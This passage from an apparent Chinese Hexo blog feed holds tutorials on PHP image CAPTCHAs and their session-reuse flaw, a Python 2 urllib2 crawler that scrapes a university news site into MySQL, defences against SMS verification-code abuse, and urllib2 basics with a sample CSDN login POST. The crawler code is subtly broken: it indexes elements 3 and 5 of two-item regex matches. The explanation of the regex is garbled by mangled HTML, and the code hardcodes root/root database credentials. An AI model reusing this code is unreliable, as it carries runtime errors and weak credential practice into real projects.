<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$img_handle = Imagecreate(80, 20);  //图片大小80X20</div><div class="line">$back_color = ImageColorAllocate($img_handle, 255, 255, 255); //背景颜色（白色）</div><div class="line">$txt_color = ImageColorAllocate($img_handle, 0,0, 0);  //文本颜色（黑色）</div><div class="line"></div><div class="line">//加入干扰线</div><div class="line">for($i=0;$i&lt;3;$i++)</div><div class="line">&#123;</div><div class="line">    $line = ImageColorAllocate($img_handle,rand(0,255),rand(0,255),rand(0,255));</div><div class="line">    Imageline($img_handle, rand(0,15), rand(0,15), rand(100,150),rand(10,50), $line);</div><div class="line">&#125;</div><div class="line">//加入干扰象素</div><div class="line">for($i=0;$i&lt;200;$i++) </div><div class="line">&#123;</div><div class="line">    $randcolor = ImageColorallocate($img_handle,rand(0,255),rand(0,255),rand(0,255));</div><div class="line">    Imagesetpixel($img_handle, rand()%100 , rand()%50 , $randcolor);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>填充图片背景色，再将产生的随机字符串填充图片；</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Imagefill($img_handle, 0, 0, $back_color);             //填充图片背景色</div><div class="line">ImageString($img_handle, 28, 10, 0, $code, $txt_color);//水平填充一行字符串</div></pre></td></tr></table></figure>
<ul>
<li>清空输出缓存区，再生成验证码图片，并显示图片。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ob_clean();   // ob_clean()清空输出缓存区    </div><div class="line">header(&quot;Content-type: image/png&quot;); //生成验证码图片    </div><div class="line">Imagepng($img_handle);//显示图片</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="验证码安全性"><a href="#验证码安全性" class="headerlink" title="验证码安全性"></a>验证码安全性</h3><p>验证码通常是由php脚本生成的随机字符串，通过GD库的处理，制作成图片。真正的验证码字符串保存在SESSION中，然后把生成的图片展示给用户。用户填写了验证码提交后，在服务端上SESSION中的验证码进行比对。</p>
<p>这里有一个很多人都会犯的错误。验证码比对完成之后，不管是正确还是错误，我都没有清理SESSION。这样产生了一个问题，一旦一个用户第一次提交验证码成功，第二次以后不再访问生成验证码的脚本，这时候SESSION中的验证码并没有更新，也没有删除，导致验证码重复使用，起不到验证的作用。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt; 验证码（CAPTCHA）是“Completely Automated Public Turing test to tell Compute
    
    </summary>
    
      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>python|urllib2的一个简单案例</title>
    <link href="http://yoursite.com/2018/03/21/python-urllib2%E7%9A%84%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E6%A1%88%E4%BE%8B/"/>
    <id>http://yoursite.com/2018/03/21/python-urllib2的一个简单案例/</id>
    <published>2018-03-20T23:50:24.000Z</published>
    <updated>2018-03-20T16:43:02.616Z</updated>
    
    <content type="html"><![CDATA[<h3 id="网络爬虫的概念"><a href="#网络爬虫的概念" class="headerlink" title="网络爬虫的概念"></a>网络爬虫的概念</h3><p>网络爬虫（Web Spider）是一种自动获取网页内容的程序，是搜索引擎的重要组成部分。 初次深入了解爬虫的概念是在吴军博士的《数学之美》中，其中描述互联网本质上就是一张无形的大网，我们可以把每一个网页当做网中的节点，超链接作为连接节点的弧。这样网络爬虫就可以从任何一个网页出发，通过图的遍历算法，自动的访问每一个网页并将它们存起来。</p>
<p>实际上程序的目的都是代替人来完成大量的重复操作，爬虫亦是如此。假设现有一个需求是需要获取<a href="http://news.upc.edu.cn/sdyw" target="_blank" rel="external">中国石油大学新闻网</a>的所有新闻标题及发布日期来进行统计分析，那么用人来实现这个需求需要大概以下几个步骤。</p>
<ol>
<li>通过浏览器访问中国石油大学新闻网。</li>
<li>根据网页内容分析出哪些地方是我们需要获取的标题和日期。</li>
<li>将获取的数据存储到文件中。</li>
<li>跳转到下一页重复执行2和3步骤直到所有内容获取完毕。</li>
</ol>
<p>接下来我们就会按照以上思路用Python编写一个简单的爬虫。</p>
<h3 id="llib2抓取网页内容"><a href="#llib2抓取网页内容" class="headerlink" title="llib2抓取网页内容"></a>llib2抓取网页内容</h3><p>网页抓取就是把URL地址指定的网络资源读取出来，保存到本地。相当于我们平时在浏览器中通过网址浏览网页，只不过我们看到的是解析过的页面效果，而程序获取到的是源代码等资。 Python的标准库和组件非常强大，可以处理包括数学计算、网络传输、正则表达式等诸多操作。urllib2就是使用各种协议打开url的一个扩展包。最简单的方法就是调用urlopen的方法，比如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">import urllib2</div><div class="line"></div><div class="line">url=&quot;http://news.upc.edu.cn/sdyw/&quot;</div><div class="line">response=urllib2.urlopen(url)</div><div class="line">html=response.read()</div><div class="line">print html</div></pre></td></tr></table></figure></p>
<p>运行以上代码，可以得到以下结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/loose.dtd&quot;&gt;</div><div class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;</div><div class="line">&lt;title&gt;中国石油大学新闻网&lt;/title&gt;</div><div class="line">&lt;meta name=&quot;keywords&quot; content=&apos;石大门户网,石大资讯,石大新闻,中国石油大学新闻网,创造太阳网,石油之光&apos; /&gt;</div><div class="line">&lt;!--省略以下运行结果--&gt;</div></pre></td></tr></table></figure></p>
<p>我们在浏览器中打开该网址，右键选择查看源代码发现和输出的内容是一致的，这时我们第一步已经完成了。</p>
<h3 id="正则表达式返回匹配信息"><a href="#正则表达式返回匹配信息" class="headerlink" title="正则表达式返回匹配信息"></a>正则表达式返回匹配信息</h3><p>第二步中分析出哪些信息是我们需要的信息这个过程对于人来说非常简单，但是对于电脑就没那么容易了，这里需要引入正则表达式的概念。</p>
<blockquote>
<p>正则表达式，又称正规表示法、常规表示法（英语：Regular Expression，在代码中常简写为regex、regexp或RE），计算机科学的一个概念。正则表达式使用单个字符串来描述、匹配一系列符合某个句法规则的字符串。在很多文本编辑器里，正则表达式通常被用来检索、替换那些符合某个模式的文本。</p>
</blockquote>
<p>简而言之，正则表达式就是为了处理相对复杂的文本查询或替换。 我们在新闻标题上单击右键，选择查看元素，这样Chrome浏览器下方就会出现开发者工具，并定位新闻标题所在HTML的位置。</p>
<p><img src="/images/python-urllib2实践-01.jpg" alt="查找结果" title="python-urllib2实践-01"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;/sdyw/2014/04/17/15361630123.shtml&quot; target=&quot;_blank&quot;&gt;1项目入选团中央学校共青团重点工作创新试点&lt;/a&gt;</div></pre></td></tr></table></figure>
<p>我们分析HTML可以得知&lt;a href=”/sdyw/是标题的固定前缀，2014/04/17是新闻发布日期，15361630123.shtml是随机生成的静态页面名称。1项目入选团中央学校共青团重点工作创新试点是我们需要获取的新闻标题，最后以结尾，实现代码如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"># -*- coding: utf-8 -*- </div><div class="line">import urllib2</div><div class="line">import re</div><div class="line"># 1.获取访问页面的HMTL</div><div class="line">url=&quot;http://news.upc.edu.cn/sdyw/&quot;</div><div class="line">response=urllib2.urlopen(url)</div><div class="line">html=response.read()</div><div class="line"># 2.根据正则表达式抓取特定内容</div><div class="line">r=re.compile(r&apos;&lt;a href=&quot;/sdyw/(?P&lt;Date&gt;.&#123;10&#125;).*&quot; target=&quot;_blank&quot;&gt;(?P&lt;Title&gt;.+)&lt;/a&gt;&apos;)</div><div class="line">news=r.findall(html)</div><div class="line">print news</div></pre></td></tr></table></figure>
<p>在上方加入import re来导入python自带的正则表达式模块，通过re.compile(strPattern[, flag])方法将字符串形式的正则表达式编译为Pattern对象，第二个参数flag是匹配模式，我们此处省略填写。</p>
<p>正则表达式字符串开头有一个前缀r，r是raw(原始)的意思。因为在表示字符串中有一些转义符，如表示回车’\n’。如果要表示\需要写为’\‘。但如果我就是需要表示一个’\’+’n’，不用r方式要写为:’\n’。但使用r方式则为r’\n’这样清晰多了。</p>
<p>固定字符串<a href="/sdyw/后跟了一个用括号包起来的字符串(?P<Date>.{10})，(?P<name>...) 是定义一个命名组，(?P=name)则是对命名组的逆向引用。而后面的.匹配任意除换行符" \n"以外的字符。.{10}匹配10个任意字符，<a="" highlight="" plain"=""><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">for i in range(len(news)):</div><div class="line">    date=news[i][0]</div><div class="line">    title=news[i][3]</div><div class="line">    print title+&quot; &quot;+date</div></pre></td></tr></table>
<h4 id="遍历所有新闻页面"><a href="#遍历所有新闻页面" class="headerlink" title="遍历所有新闻页面"></a>遍历所有新闻页面</h4><p>上一节我们获取到了第一页的新闻数据，但是我们的目的是需要获取所有的内容。 那我们跳转到其他分页看看有没有什么规律可循。通过分析发现，第一页的url为http://news.upc.edu.cn/sdyw/List_171.shtml，第二页的url为http://news.upc.edu.cn/sdyw/List_170.shtml,最后一页的url为http://news.upc.edu.cn/sdyw/List_1.shtml。那么遍历所有新闻页面获取内容这件事就变的非常简单了，直接通过for循环就可以实现，废话不说了，直接上代码吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"># -*- coding: utf-8 -*- </div><div class="line">import urllib2</div><div class="line">import re</div><div class="line">import MySQLdb as mdb</div><div class="line"></div><div class="line">if __name__==&quot;__main__&quot;:</div><div class="line">    url=&quot;http://news.upc.edu.cn/sdyw/List_&quot;</div><div class="line">    con=mdb.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;root&apos;,&apos;Python&apos;,charset=&apos;utf8&apos;)</div><div class="line">    with con:</div><div class="line">        for x in xrange(1,171):</div><div class="line">            response=urllib2.urlopen(url+str(x)+&apos;.shtml&apos;)</div><div class="line">            html=response.read()</div><div class="line">            r=re.compile(r&apos;&lt;a href=&quot;/sdyw/(?P&lt;Date&gt;.&#123;10&#125;).*&quot; target=&quot;_blank&quot;&gt;(?P&lt;Title&gt;.+)&lt;/a&gt;&apos;)</div><div class="line">            news=r.findall(html)</div><div class="line">            curs=con.cursor()</div><div class="line">            for i in range(len(news)):</div><div class="line">                date=news[i][0]</div><div class="line">                title=news[i][5]</div><div class="line">                curs.execute(&quot;INSERT INTO news2(PublishDate,Title) VALUES(%s,%s)&quot;,(date,title))</div><div class="line">                print title+&quot; &quot;+date</div></pre></td></tr></table></figure></p>
<p>到此，本文已经结束了，短短的20行代码就可以实现一个简单的爬虫，这就是Python的魅力。</p>
</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;网络爬虫的概念&quot;&gt;&lt;a href=&quot;#网络爬虫的概念&quot; class=&quot;headerlink&quot; title=&quot;网络爬虫的概念&quot;&gt;&lt;/a&gt;网络爬虫的概念&lt;/h3&gt;&lt;p&gt;网络爬虫（Web Spider）是一种自动获取网页内容的程序，是搜索引擎的重要组成部分。 初次深入了
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>安全|谈谈如何防范短信验证码被攻击</title>
    <link href="http://yoursite.com/2018/03/21/%E5%AE%89%E5%85%A8-%E8%B0%88%E8%B0%88%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%E7%A0%81%E8%A2%AB%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2018/03/21/安全-谈谈如何防范短信验证码被攻击/</id>
    <published>2018-03-20T23:30:15.000Z</published>
    <updated>2018-03-20T17:13:32.379Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近在写个项目，需要发送验证验证手机号，之前的接口设计是只需要发送电话号码过来，后台验证电话号码的正确性，就发送验证码。</p>
<p>殊不知这样设计存在巨大的安全隐患。如果短信验证码接口和页面不做任何限制，黑客很容易利用一些恶意的短信轰炸软件对接口进行攻击，不停的对同一个号码或者N个号码重复发送验证码短信。</p>
<p>短信验证码被攻击，不仅会对用户造成骚扰，引起投诉，更会浪费你的短信余额，降低品牌形象。</p>
<h3 id="验证的必要性"><a href="#验证的必要性" class="headerlink" title="验证的必要性"></a>验证的必要性</h3><p>在现实生活中，需要用户验证其手机号的场景有很多，例如：使用手机号注册账号、手机号修改密码、提交用户联系方式等……</p>
<p>在这些场景中服务商要求用户对自身手机号码进行验证的原因在于：确保用户手机号真实、可用。</p>
<p>确保能通过该联系方式联系到用户本人<br>防止用户随机提交他人手机号作为自身联系方式</p>
<h3 id="验证方法是什么？"><a href="#验证方法是什么？" class="headerlink" title="验证方法是什么？"></a>验证方法是什么？</h3><p>现在普遍采用验证码方式对手机号进行验证，分为：</p>
<ul>
<li>短信验证码</li>
<li>语音验证码</li>
</ul>
<h3 id="验证需要注意哪些？"><a href="#验证需要注意哪些？" class="headerlink" title="验证需要注意哪些？"></a>验证需要注意哪些？</h3><p>在用户进行手机号验证的过程中可能会出现如下问题：</p>
<ul>
<li>用户利用短信验证码接口向他人频繁发送骚扰短信</li>
<li>用户通过发包暴力破解验证码</li>
</ul>
<p>因此在验证过程中需加入如下手段：</p>
<ul>
<li>在发送短信验证码前需让用户进行图形验证码校验</li>
<li>用户提交短信验证码失败5次后，将此短信验证码作废</li>
</ul>
<p>为防止用户对验证码的暴力破解和重复使用，加入验证码作废机制：</p>
<ul>
<li>图形验证码对比 1 次后（无论成功与否）立即失效</li>
<li>短信验证码成功对比 1 次后立即失效</li>
<li>短信验证码错误对比 5 次后失效</li>
</ul>
<h3 id="如何防范短信验证码被攻击？"><a href="#如何防范短信验证码被攻击？" class="headerlink" title="如何防范短信验证码被攻击？"></a>如何防范短信验证码被攻击？</h3><h4 id="图形验证码"><a href="#图形验证码" class="headerlink" title="图形验证码"></a>图形验证码</h4><p>大部分短信轰炸脚本基于网页爬虫，图形验证码可以简单粗暴的防御这类刷码行为。</p>
<p><img src="/images/web安全-短信验证-01.png" alt="图片验证" title="web安全-短信验证-01"></p>
<h4 id="记录、比对IP和手机号码，做频率限制，过滤空IP头"><a href="#记录、比对IP和手机号码，做频率限制，过滤空IP头" class="headerlink" title="记录、比对IP和手机号码，做频率限制，过滤空IP头"></a>记录、比对IP和手机号码，做频率限制，过滤空IP头</h4><p>用户请求验证码时，记录请求的IP和手机号码，并对发送频率做限制，例如每分钟/单个IP/单个手机号仅能请求一次。如果脚本无法获取用户的真实IP，请直接过滤这类请求。</p>
<h4 id="在-SUBMAIL-设置验证码模板的单日请求上线"><a href="#在-SUBMAIL-设置验证码模板的单日请求上线" class="headerlink" title="在 SUBMAIL 设置验证码模板的单日请求上线"></a>在 SUBMAIL 设置验证码模板的单日请求上线</h4><p>设置验证码模板的单日请求上限，设置一个合适的数值，这样每个手机号码单日超过这个上线的数量的验证码请求会被SUBMAIL直接过滤。</p>
<h4 id="设置-IP-白名单"><a href="#设置-IP-白名单" class="headerlink" title="设置 IP 白名单"></a>设置 IP 白名单</h4><p>设置IP白名单，保护您的APPID不被非法劫持后滥用,只允许名单内的ip请求能得到相应。</p>
<h4 id="SUBMAIL-主动防御机制"><a href="#SUBMAIL-主动防御机制" class="headerlink" title="SUBMAIL 主动防御机制"></a>SUBMAIL 主动防御机制</h4><p>如上述3种方法还不能完全防御，您也不用担心，因为SUBMAIL为短信验证码接口植入了主动防御的机制，提供了更强大的保护措施。SUBMAIL 主动防御机制会在以下3种情况中被触发：</p>
<ol>
<li>空号率触发安全机制：当用户请求发送的手机号码空号率达到一定的百分比之后，触发防御机制；</li>
<li>手机号码高频率请求触发安全机制：当单个手机号高频率的请求验证码时，到达一定比例，触发防御机制；</li>
<li>历史黑名单命中率触发安全机制：当命中历史黑名单到达一定比例时，触发防御机制；</li>
</ol>
<p>SUBMAIL 主动防御机制被触发后，将会自动设置合适的安全级别，防御恶意请求。例如非常请求仅能获取3次验证码，如超过3次，将会被列入临时保护黑名单。</p>
<h4 id="使用PHP实现的一个小案例"><a href="#使用PHP实现的一个小案例" class="headerlink" title="使用PHP实现的一个小案例"></a>使用PHP实现的一个小案例</h4><h5 id="图形验证码-1"><a href="#图形验证码-1" class="headerlink" title="图形验证码"></a>图形验证码</h5><p>验证过程主要分为以下几步：</p>
<ul>
<li>生成图形验证码</li>
<li>将验证码字符串保存在 session 中</li>
<li>将用户所提交的验证码与 session 对比<ul>
<li>对比成功：用户通过图形验证码验证，程序进入下一流程，销毁 session</li>
<li>对比失败：销毁 session。刷新验证码，要求用户重新进行验证操作</li>
</ul>
</li>
</ul>
<p>其中，生成图形验证码的大致步骤为：</p>
<ul>
<li>产生一个随机字符串</li>
<li>创建一个图像</li>
<li>将字符串输出到图像中</li>
<li>在图像中加入噪点干扰，例如直线、雪花点等</li>
<li>输出图像</li>
<li>销毁图像资源</li>
</ul>
<h5 id="短信验证码"><a href="#短信验证码" class="headerlink" title="短信验证码"></a>短信验证码</h5><p>和图形验证码的机制是一样的，也是将用户提交的验证码与 session 做对比。验证过程如下：</p>
<ul>
<li>产生一个随机 6 位数（按需求而定）</li>
<li>将随机数存储在 session 中</li>
<li>拟定短信文案，加入验证码信息，调用短信平台接口向指定手机号发送短信</li>
<li>将用户所提交的验证码与 session 内容进行对比<ul>
<li>对比成功：用户通过短信验证码流程，销毁 session，进入下一步流程（允许用户获取短信验证码）</li>
<li>对比失败：<ul>
<li>失败次数 &lt;5 ：允许用户重新提交验证码进行验证</li>
<li>失败次数 &gt;=5 ：销毁 session，用户若再提交，提示用户验证码已过期，要求用户重新获取验证码</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">/**</div><div class="line"> * @param $code 验证码</div><div class="line"> * @param $phone 用户手机号</div><div class="line"> * @return int -1：已过期 0:失败 1:成功</div><div class="line"> */</div><div class="line">private function checkCode($code, $phone)</div><div class="line">&#123;</div><div class="line">    session_start();</div><div class="line">    if (!isset($_SESSION[static::MESSAGE_CODE_TIME]) || !isset($_SESSION[static::MESSAGE_CODE])) &#123;</div><div class="line">        return 0;</div><div class="line">    &#125;</div><div class="line">	// 验证码五分钟后过期</div><div class="line">    if ($_SESSION[static::MESSAGE_CODE_TIME] + 60*5 &lt; time()) &#123;</div><div class="line">        // 销毁 session</div><div class="line">        $this-&gt;unsetCode();</div><div class="line">        return -1;</div><div class="line">    &#125; else &#123;</div><div class="line">        if ($_SESSION[static::MESSAGE_CODE] == $code &amp;&amp; $_SESSION[static::MESSAGE_CODE_USER] == $phone) &#123;</div><div class="line">            // 销毁 session</div><div class="line">            $this-&gt;unsetCode();</div><div class="line">            return 1;</div><div class="line">        &#125; else &#123;</div><div class="line">            // 输入验证码错误</div><div class="line">            if (!isset($_SESSION[static::SESSION_MESSAGE_CODE_COUNT])) &#123;</div><div class="line">            		// 初始化错误次数</div><div class="line">                $_SESSION[static::SESSION_MESSAGE_CODE_COUNT] = 1;</div><div class="line">            &#125; else &#123;</div><div class="line">            		// 记录错误次数</div><div class="line">                $_SESSION[static::SESSION_MESSAGE_CODE_COUNT]++;</div><div class="line">            &#125;</div><div class="line">            if ($_SESSION[static::SESSION_MESSAGE_CODE_COUNT] &gt;= 5) &#123;</div><div class="line">                // 尝试超过5次，销毁 session</div><div class="line">                $this-&gt;unsetCode();</div><div class="line">            &#125;</div><div class="line">            return 0;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;最近在写个项目，需要发送验证验证手机号，之前的接口设计是只需要发送电话号码过来，后台验证电话号码的正确性，就发送验证码。&lt;/p&gt;
&lt;p&gt;殊不
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>pyhon|网络urllib2模块</title>
    <link href="http://yoursite.com/2018/03/20/pyhon-%E7%BD%91%E7%BB%9Curllib2%E6%A8%A1%E5%9D%97/"/>
    <id>http://yoursite.com/2018/03/20/pyhon-网络urllib2模块/</id>
    <published>2018-03-19T23:10:34.000Z</published>
    <updated>2018-03-20T15:46:13.377Z</updated>
    
    <content type="html"><![CDATA[<h3 id="分分钟扒一个网页下来"><a href="#分分钟扒一个网页下来" class="headerlink" title="分分钟扒一个网页下来"></a>分分钟扒一个网页下来</h3><p>怎样扒网页呢？其实就是根据URL来获取它的网页信息，虽然我们在浏览器中看到的是一幅幅优美的画面，但是其实是由浏览器解释才呈现出来的，实质它 是一段HTML代码，加 JS、CSS，如果把网页比作一个人，那么HTML便是他的骨架，JS便是他的肌肉，CSS便是它的衣服。所以最重要的部分是存在于HTML中的，下面我 们就写个例子来扒一个网页下来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">import  urllib2</div><div class="line">response  =  urllib2.urlopen(&quot;http://www.baidu.com&quot;)</div><div class="line">print  response.read()</div></pre></td></tr></table></figure></p>
<p>是的你没看错，真正的程序就两行，把它保存成 demo.py，进入该文件的目录，执行如下命令查看运行结果，感受一下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python demo.py</div></pre></td></tr></table></figure></p>
<p><img src="/images/python-urllib2-01.png" alt="爬虫--html" title="python-urllib2-01"></p>
<h3 id="分析扒网页的方法"><a href="#分析扒网页的方法" class="headerlink" title="分析扒网页的方法"></a>分析扒网页的方法</h3><p>那么我们来分析这两行代码，第一行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">response  =  urllib2.urlopen(&quot;http://www.baidu.com&quot;)</div></pre></td></tr></table></figure></p>
<p>首先我们调用的是urllib2库里面的urlopen方法，传入一个URL，这个网址是百度首页，协议是HTTP协议，当然你也可以把HTTP换做FTP,FILE,HTTPS 等等，只是代表了一种[访问控制]协议，urlopen一般接受三个参数，它的参数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">urlopen(url, data, timeout)</div></pre></td></tr></table></figure></p>
<p>第一个参数url即为URL，第二个参数data是访问URL时要传送的数据，第三个timeout是设置超时时间。</p>
<p>第二三个参数是可以不传送的，data默认为空None，timeout默认为 socket._GLOBAL_DEFAULT_TIMEOUT</p>
<p>第一个参数URL是必须要传送的，在这个例子里面我们传送了百度的URL，执行urlopen方法之后，返回一个response对象，返回信息便保存在这里面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">print response.read()</div></pre></td></tr></table></figure></p>
<p>response对象有一个read方法，可以返回获取到的网页内容。</p>
<p>如果不加read直接打印会是什么？答案如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">addinfourl at 139728495260376 whose fp = socket._fileobject object at 0x7f1513fb3ad0&gt;&gt;</div></pre></td></tr></table></figure></p>
<p>直接打印出了该对象的描述，所以记得一定要加read方法，否则它不出来内容可就不怪我咯！</p>
<h3 id="构造Requset"><a href="#构造Requset" class="headerlink" title="构造Requset"></a>构造Requset</h3><p>其实上面的urlopen参数可以传入一个request请求,它其实就是一个Request类的实例，构造时需要传入Url,Data等等的内容。比如上面的两行代码，我们可以这么改写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">import  urllib2</div><div class="line"></div><div class="line">request  =  urllib2.Request(&quot;http://www.baidu.com&quot;)</div><div class="line"></div><div class="line">response  =  urllib2.urlopen(request)</div><div class="line"></div><div class="line">print  response.read()</div></pre></td></tr></table></figure></p>
<p>运行结果是完全一样的，只不过中间多了一个request对象，推荐大家这么写，因为在构建请求时还需要加入好多内容，通过构建一个request，[服务器]响应请求得到应答，这样显得逻辑上清晰明确。</p>
<h3 id="POST和GET数据传送"><a href="#POST和GET数据传送" class="headerlink" title="POST和GET数据传送"></a>POST和GET数据传送</h3><p>上面的程序演示了最基本的网页抓取，不过，现在大多数网站都是动态网页，需要你动态地传递参数给它，它做出对应的响应。所以，在访问时，我们需要传递数据给它。最常见的情况是什么？对了，就是登录注册的时候呀。</p>
<p>把数据用户名和密码传送到一个URL，然后你得到服务器处理之后的响应，这个该怎么办？下面让我来为小伙伴们揭晓吧！</p>
<p>数据传送分为POST和GET两种方式，两种方式有什么区别呢？</p>
<p>最重要的区别是GET方式是直接以链接形式访问，链接中包含了所有的参数，当然如果包含了密码的话是一种不安全的选择，不过你可以直观地看到自己提交了什么内容。POST则不会在网址上显示所有的参数，不过如果你想直接查看提交了什么就不太方便了，大家可以酌情选择。</p>
<h4 id="POST方式："><a href="#POST方式：" class="headerlink" title="POST方式："></a>POST方式：</h4><p>上面我们说了data参数是干嘛的？对了，它就是用在这里的，我们传送的数据就是这个参数data，下面[演示]一下POST方式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">import  urllib</div><div class="line"></div><div class="line">import  urllib2</div><div class="line"></div><div class="line">values  =  &#123;&quot;username&quot;:&quot;1016903103@qq.com&quot;,&quot;password&quot;:&quot;XXXX&quot;&#125;</div><div class="line"></div><div class="line">data  =  urllib.urlencode(values)</div><div class="line"></div><div class="line">url  =  &quot;https://passport.csdn.net/account/login?from=http://my.csdn.net/my/mycsdn&quot;</div><div class="line"></div><div class="line">request  =  urllib2.Request(url,data)</div><div class="line"></div><div class="line">response  =  urllib2.urlopen(request)</div><div class="line"></div><div class="line">print  response.read()</div></pre></td></tr></table></figure></p>
<p>我们引入了urllib库，现在我们模拟登陆CSDN，当然上述代码可能登陆不进去，因为还要做一些设置头部header的工作，或者还有一些参数 没有设置全，还没有提及到在此就不写上去了，在此只是说明登录的原理。我们需要定义一个字典，名字为values，参数我设置了username和 password，下面利用urllib的urlencode方法将字典编码，命名为data，构建request时传入两个参数，url和data，运 行程序，即可实现登陆，返回的便是登陆后呈现的页面内容。当然你可以自己搭建一个[服务器]来测试一下。</p>
